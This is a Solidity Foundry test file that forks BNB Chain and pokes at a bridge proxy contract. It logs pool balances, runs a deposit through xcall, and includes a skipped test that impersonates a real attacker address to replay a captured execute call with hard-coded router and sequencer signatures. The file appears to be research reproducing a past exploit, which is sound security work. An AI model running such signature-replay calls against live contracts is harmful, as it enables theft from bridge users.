// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./connext__bscscan__common.sol";

contract connext_bscscan_LP_Test is ConnextBscscanCommon {
    using SafeMath for uint256;

    function setUp() public {
        super.setUp2();

        // Default fork
        cheats.createSelectFork("bsc", 29004971);

        // Pre-load tokens
        // writeTokenBalance(address(this), fl_token, payback_fee_amount);
    }

    // ----------------------------------------------------------------------------
    // LP Balance
    // ----------------------------------------------------------------------------
    function test__query_lp_balance() public {
        emit log_named_decimal_uint(
            "[Start] ConnextDiamond_Proxy DAI balance before exploit",
            DAI.balanceOf(address(ConnextDiamond_Proxy)),
            DAI.decimals()
        );

        emit log_named_decimal_uint(
            "[Start] ConnextDiamond_Proxy B_USDC balance before exploit",
            B_USDC.balanceOf(address(ConnextDiamond_Proxy)),
            B_USDC.decimals()
        );

        emit log_named_decimal_uint(
            "[Start] ConnextDiamond_Proxy B_USDT balance before exploit",
            B_USDT.balanceOf(address(ConnextDiamond_Proxy)),
            B_USDT.decimals()
        );

        emit log_named_decimal_uint(
            "[Start] ConnextDiamond_Proxy ETH balance before exploit",
            ETH.balanceOf(address(ConnextDiamond_Proxy)),
            ETH.decimals()
        );

        // Approval
        DAI.approve(address(ConnextDiamond_Proxy), type(uint256).max);
        B_USDC.approve(address(ConnextDiamond_Proxy), type(uint256).max);
        B_USDT.approve(address(ConnextDiamond_Proxy), type(uint256).max);
        ETH.approve(address(ConnextDiamond_Proxy), type(uint256).max);

        // DAI.approve(address(DAI_USDC_Pair), type(uint256).max);
        // B_USDC.approve(address(DAI_USDC_Pair), type(uint256).max);
        // B_USDT.approve(address(DAI_USDC_Pair), type(uint256).max);
        // ETH.approve(address(DAI_USDC_Pair), type(uint256).max);

        // Fund the account with flashloan and/or cash
        uint account_deposit_amount = DAI.balanceOf(
            address(ConnextDiamond_Proxy)
        );
        if (account_deposit_amount > 0) {
            writeTokenBalance(address(this), address(DAI), account_deposit_amount);
        }

        emit log_named_decimal_uint(
            "[Start] Attacker DAI balance before deposit",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        emit log_named_decimal_uint(
            "[Start] Attacker B_USDC balance before deposit",
            B_USDC.balanceOf(address(this)),
            B_USDC.decimals()
        );

        // // Query reserves
        // (
        //     uint112 _reserve0,
        //     uint112 _reserve1,
        //     uint32 _blockTimestampLast
        // ) = DAI_USDC_Pair.getReserves();
        // emit log_named_uint("_reserve0", _reserve0);
        // emit log_named_uint("_reserve1", _reserve1);
        // emit log_named_uint("account_deposit_amount", account_deposit_amount);

        // uint amount0Out = 0;
        // uint amount1Out = account_deposit_amount;
        // require(
        //     amount0Out < _reserve0 && amount1Out < _reserve1,
        //     "Pancake: INSUFFICIENT_LIQUIDITY"
        // );

        // Convert DAI to B_USDC
        // to_nextSymbol(DAI, account_deposit_amount);
        // to_nextSymbol(nextUSDC, nextDAI.balanceOf(address(this)));

        emit log_named_decimal_uint(
            "[End] Attacker DAI balance after deposit",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        emit log_named_decimal_uint(
            "[End] Attacker B_USDC balance after deposit",
            B_USDC.balanceOf(address(this)),
            B_USDC.decimals()
        );
    }

    // ----------------------------------------------------------------------------
    // Signature Replay
    // ----------------------------------------------------------------------------
    // https://explorer.phalcon.xyz/tx/bsc/0x9a171d008a899d2ef6bfee7cb86fdf768be1d118ae4ff959fd058e19a8e80671
    function skip_test__execute_replay() public {
        // Specific fork
        cheats.createSelectFork("bsc", 28918996);

        cheats.expectRevert(0x1955d616);

        // Attacker is current contract
        address attacker_contract_address = address(this);

        // Attacker is real account
        attacker_contract_address = address(
            0x935AaAe0f5b02007c08512F0629a9d37Af2E1A47
        );

        if (attacker_contract_address != address(this)) {
            // Impersonate as attacker
            cheats.prank(address(attacker_contract_address));
            cheats.label(
                address(attacker_contract_address),
                "Impersonated_Account"
            );
        }

        bytes
            memory callData = hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000e5d55ffcfe2191b71464dd7df76d18d8482ba9be000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000001111111254eeb25477b68fb85ed929f73a9605820000000000000000000000001111111254eeb25477b68fb85ed929f73a9605820000000000000000000000008ac76a51cc950d9822d68b83fe1ad97b32cd580d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044f9339695fc8d0700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000024812aa3caf00000000000000000000000014831f12fccc86c4f3dae41c769593df766e43530000000000000000000000008ac76a51cc950d9822d68b83fe1ad97b32cd580d000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee00000000000000000000000014831f12fccc86c4f3dae41c769593df766e4353000000000000000000000000dd1305150d27aecc60c066630105db419977e36700000000000000000000000000000000000000000000000044f9339695fc8d0700000000000000000000000000000000000000000000000000434916224dd942000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bf0000000000000000000000000000000000000000000000a100008b00004f02a00000000000000000000000000000000000000000000000000042f2873a92ecc0ee63c1e5015289a8dbf7029ee0b0498a84777ed3941d9acfec8ac76a51cc950d9822d68b83fe1ad97b32cd580d4101bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00042e1a7d4d0000000000000000000000000000000000000000000000000000000000000000c0611111111254eeb25477b68fb85ed929f73a960582002e9b3012000000000000000000000000000000000000000000000000";

        TransferInfo memory params = TransferInfo(
            Polygon_Domain_ID,
            BNB_Domain_ID,
            Ethereum_Mainnet_Domain_ID,
            address(Receiver),
            address(delegate),
            false,
            callData,
            50,
            address(LiFiDiamond),
            4995154,
            5000000000000000000,
            50979,
            0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
        );

        address[] memory routers = new address[](1);
        routers[0] = address(router);

        bytes[] memory routerSignatures = new bytes[](1);
        routerSignatures[
            0
        ] = hex"96b4d258b5c8309b082815d7d4f6c39c8d133a51a87569e622ed5dbac83241cd43b0397f2688e2d64a93204abb6a7a09de787f129edb7f93a92714d4938630a41c";

        ExecuteArgs memory _args = ExecuteArgs(
            params,
            routers,
            routerSignatures,
            address(sequencer),
            hex"75d3ef1ecb8e6155a3b31007891756ad7a68159826d01559330e22595d7b2b9a3a3a53c88886754b1479cdca46508d172d837809b28a640d2718fb9b33df29261c"
        );
        ConnextDiamond_Proxy.execute(_args);
    }

    // ----------------------------------------------------------------------------
    // Deposit
    // ----------------------------------------------------------------------------
    // Txn: https://explorer.phalcon.xyz/tx/bsc/0x8ca7278a300501534b328d21100fe73e119bf625fc9f1e2f20b5f1b8721dbffb
    function test__deposit_into_proxy() public {
        // Attacker contract
        address attacker_contract_address = address(this);
        // attacker_contract_address = address(
        //     0x8e4263802b135f035Dd24FB2fBD31b98366502e3
        // );

        // Configure the upper limit of cash as logically attacker would have limited cash
        uint MAX_USDC = 10_000 * 1e18;
        uint account_deposit_amount = MAX_USDC;
        if (attacker_contract_address != address(this)) {
            // Impersonate as attacker
            cheats.prank(attacker_contract_address);
            cheats.label(
                address(attacker_contract_address),
                "Impersonated_Account"
            );
        } else {
            // Fund the account with flashloan and/or cash
            writeTokenBalance(
                address(this),
                address(B_USDC),
                account_deposit_amount
            );
        }

        emit log_named_decimal_uint(
            "[Start] Attacker B_USDC balance before exploit",
            B_USDC.balanceOf(address(this)),
            B_USDC.decimals()
        );

        emit log_named_decimal_uint(
            "[Start] ConnextDiamond_Proxy B_USDC balance before exploit",
            B_USDC.balanceOf(address(ConnextDiamond_Proxy)),
            B_USDC.decimals()
        );

        // Approval
        B_USDC.approve(address(ConnextDiamond_Proxy), type(uint256).max);

        // Setup for xcall
        uint32 destination = Ethereum_Mainnet_Domain_ID;
        address to = attacker_contract_address;
        address asset = address(B_USDC);
        address delegate = address(ConnextDiamond_Proxy);
        uint256 amount = account_deposit_amount;
        uint256 slippage = 300;
        bytes memory callData = "";

        ConnextDiamond_Proxy.xcall(
            destination,
            to,
            asset,
            delegate,
            amount,
            slippage,
            callData
        );

        emit log_named_decimal_uint(
            "[End] Attacker B_USDC balance after exploit",
            B_USDC.balanceOf(address(this)),
            B_USDC.decimals()
        );

        emit log_named_decimal_uint(
            "[End] ConnextDiamond_Proxy B_USDC balance after exploit",
            B_USDC.balanceOf(address(ConnextDiamond_Proxy)),
            B_USDC.decimals()
        );
    }

    // ----------------------------------------------------------------------------
    // Withdrawal
    // ----------------------------------------------------------------------------
}
